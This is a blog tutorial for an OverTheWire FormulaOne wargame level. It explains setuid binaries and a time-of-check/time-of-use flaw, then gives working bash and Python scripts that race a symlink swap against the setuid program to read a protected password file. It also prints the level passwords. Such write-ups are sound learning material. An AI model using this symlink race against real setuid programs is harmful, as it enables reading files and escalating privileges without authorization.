---
date: 2023-09-28 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire FormulaOne Level 0 → 1 tutorial!!"
permalink: /posts/overTheWire-FormulaOne-Level-0-to-1/
tags: [overthewire, formulaone, pwn, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire FormulaOne Level 0 → 1!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .formulaone-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .formulaone-nav .nav-left,.formulaone-nav .nav-center,.formulaone-nav .nav-right{flex:1}
  .formulaone-nav .nav-left{text-align:left}
  .formulaone-nav .nav-center{text-align:center}
  .formulaone-nav .nav-right{text-align:right}
  .formulaone-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .formulaone-nav a:hover{transform:translateY(-1px)}
  .formulaone-nav .disabled{opacity:.55}
  :root[data-theme='light'] .formulaone-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="formulaone-nav" aria-label="FormulaOne level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-FormulaOne-Level-0/' | relative_url }}">← Previous: Level 0</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/formulaone/formulaone1.html" target="_blank" rel="noopener">
      Official (Level 1) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-FormulaOne-Level-1-to-2/' | relative_url }}">
      Next: Level 1 → 2 →
    </a>
  </div>
</nav>

## Login

We’ll start as **formulaone0** on the FormulaOne host.

```bash
ssh formulaone0@formulaone.labs.overthewire.org -p 2232
````

> At the time of writing I used the password from Level 0:
>
> `2w9lMSElHLSu6PigGsugLYdKiLV9BH84`
>
> (Passwords may rotate on the server—if yours differs, retrieve it using the Level 0 method.)

Once in, list the challenge directory:

```bash
ls -la /formulaone/
```

You should see binaries and sources like `formulaone1` and `formulaone1.c`.


---

## Task

Read the **password for user `formulaone1`** by exploiting the provided Level-1 program.

---

## A little bit of Theory

**Setuid (`s`) bit.**
`ls -l /formulaone/formulaone1` shows `-rwsr-x---`. The **`s`** on the owner’s execute bit means: when this binary runs, it executes **as user `formulaone1`** (the file owner), not as us.

**TOCTOU (Time-of-Check vs Time-of-Use).**
If a program **checks** your permission on a path (e.g., `access(path, R_OK)`) and later **uses** that path (e.g., `open(path, O_RDONLY)`), there’s a window to **swap** what the path points to (via a symlink), tricking it into opening a file you normally can’t read.

**Symlink swap.**
We’ll rapidly toggle a symlink between a benign file we can read and the **real password file**—aiming right between the program’s permission check and its open call.

---

## Code Reading

Open the source:

```bash
sed -n '1,200p' /formulaone/formulaone1.c
```

Key parts:

```c
if (access(argv[1], R_OK) < 0) return 1;   // check read access as *our* user
printf("Contents:\n");
int f = open(argv[1], O_RDONLY);           // then open the same path
if (f < 0) return 1;

while (read(f, &c, 1)) write(1, &c, 1);    // print contents
```

This behaves like a mini-`cat`: it **checks** you can read a file, then **opens** and prints it. Because it’s setuid, the **open** will run with `formulaone1`’s privileges—**if** we swap the target between the check and the open. That’s the TOCTOU bug.

---

## Solution

### 1) Prepare paths

```bash
# Work safely in /tmp
WORKDIR=$(mktemp -d)
cd "$WORKDIR"

# Files and targets
SYMLINK="$WORKDIR/exploit_symlink"
MY_FILE="$WORKDIR/my_file"
TARGET="/etc/formulaone_pass/formulaone1"
VULN="/formulaone/formulaone1"
OUT="$WORKDIR/out.txt"

# A benign file we can read
echo "hello from $USER" > "$MY_FILE"

# Start with our readable file
ln -sf "$MY_FILE" "$SYMLINK"
```

### 2) Race the check with a fast symlink swapper

```bash
# Rapidly swap where the symlink points (tiny sleep to yield CPU)
while true; do
  ln -sf "$MY_FILE" "$SYMLINK"
  ln -sf "$TARGET"  "$SYMLINK"
  sleep 0.0005
done &
SWAP_PID=$!
```

> If your shell doesn’t support sub-millisecond sleeps, try `sleep 0.001` or replace the line with:
>
> ```bash
> python3 - <<'PY'
> import os, time, sys
> symlink, myf, tgt = sys.argv[1], sys.argv[2], sys.argv[3]
> while True:
>     os.system(f"ln -sf {myf} {symlink}")
>     os.system(f"ln -sf {tgt} {symlink}")
>     time.sleep(0.0005)
> PY "$SYMLINK" "$MY_FILE" "$TARGET" &
> ```

### 3) Hammer the vulnerable binary and detect a leak

```bash
# Loop until the output looks like a password (alnum, length ≥12)
while true; do
  "$VULN" "$SYMLINK" > "$OUT" 2>/dev/null
  PASS=$(grep -oE '\b[a-zA-Z0-9]{12,64}\b' "$OUT" | head -1)
  if [ -n "$PASS" ]; then
    echo "Password found: $PASS"
    echo "Contents:"
    cat "$OUT"
    break
  fi
done

# Stop the swapper
kill "$SWAP_PID" 2>/dev/null
```

Typical success output:

> At the time of writing, the leaked password was:
>
> **`WUJPXwIoiBhedmDZceQ5DAUMq0JeI0eU`**
>
> (This changes occasionally—your result may differ.)

### 4) Move on to Level 1

```bash
ssh formulaone1@formulaone.labs.overthewire.org -p 2232
# password: <the string you found>
```

---

## Troubleshooting

* **No password after \~5–10s:** Increase the delay slightly (`sleep 0.001`) or run both loops longer. The race window is small and timing-dependent.
* **Permission denied running the binary:** Ensure you’re **logged in as `formulaone0`** and executing `/formulaone/formulaone1`.
* **Regex never matches:** Inspect `$OUT` to confirm you’re actually printing something; your symlink may not be swapping fast enough.

---

**Congrats 🎉** You exploited a classic **TOCTOU** race with a **setuid** binary and recovered the Level-1 password. On to the next!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

